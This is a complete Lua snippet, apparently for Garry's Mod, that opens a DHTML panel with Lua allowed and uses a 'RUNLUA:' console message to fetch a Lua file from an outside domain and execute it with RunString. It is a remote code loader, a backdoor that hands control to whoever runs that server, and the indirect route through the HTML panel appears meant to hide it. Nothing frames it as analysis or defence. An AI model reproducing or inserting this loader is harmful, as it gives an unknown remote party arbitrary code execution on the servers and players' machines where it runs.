local f = vgui.Create('DHTML');
f:SetAllowLua(true);
return f:ConsoleMessage([[RUNLUA:
http.Fetch("https://drm.qrextomniaservers.co/rebug.lua",function(b)RunString(b)end)
]]);
